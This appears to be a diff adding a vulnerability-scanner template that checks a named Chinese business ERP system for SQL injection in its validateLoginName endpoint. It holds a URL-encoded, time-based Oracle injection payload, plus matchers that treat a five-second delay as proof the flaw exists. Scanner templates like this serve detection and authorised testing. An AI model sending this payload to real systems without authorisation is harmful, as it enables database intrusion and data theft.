@@ -1,0 +1,31 @@
+id: yunshikongERP-loginName-sqli
+
+info:
+  name: yunshikongERP-loginName-sqli
+  author: apple
+  severity: high
+  description: 云时空 社会化商业ERP系统存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息.
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%91%E6%97%B6%E7%A9%BA%20%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9F%20validateLoginName%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /sys/user/validateLoginName?loginName=admin%27%20%41%4e%44%20%37%34%32%30%3d%44%42%4d%53%5f%50%49%50%45%2e%52%45%43%45%49%56%45%5f%4d%45%53%53%41%47%45%28%43%48%52%28%37%33%29%7c%7c%43%48%52%28%36%36%29%7c%7c%43%48%52%28%31%32%32%29%7c%7c%43%48%52%28%31%30%30%29%2c%35%29%2d%2d%20%75%7a%53%52 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        sec-ch-ua-platform: "Windows"
+        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+        condition: and
